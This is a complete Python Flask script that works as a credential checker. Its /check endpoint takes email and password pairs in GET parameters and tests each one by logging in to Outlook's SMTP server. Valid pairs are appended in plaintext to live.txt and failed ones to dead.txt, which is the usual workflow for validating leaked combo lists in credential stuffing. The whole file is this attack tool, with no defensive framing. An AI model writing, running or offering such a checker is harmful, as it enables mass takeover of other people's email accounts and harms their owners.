from flask import Flask, request
import smtplib
import traceback

app = Flask(__name__)

def check_login(email, password):
    try:
        smtp_server = "smtp-mail.outlook.com"
        smtp_port = 587
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(email, password)
        server.quit()

        return True
    except smtplib.SMTPAuthenticationError:
        return False
    except Exception as e:
        print(f"Error: {str(e)}\n{traceback.format_exc()}")
        return False

@app.route('/check', methods=['GET'])
def check_emailpass():
    email = request.args.get('email')
    password = request.args.get('pass')
    if not email or not password:
        return "Missing email or password parameters", 400
    
    result = check_login(email, password)
    if result:
        with open('live.txt', 'a') as live:
            live.write(f"{email}:{password}\n")
        return "1"
    else:
        with open('dead.txt', 'a') as dead:
            dead.write(f"{email}:{password}\n")
        return "0"

if __name__ == '__main__':
    app.run()
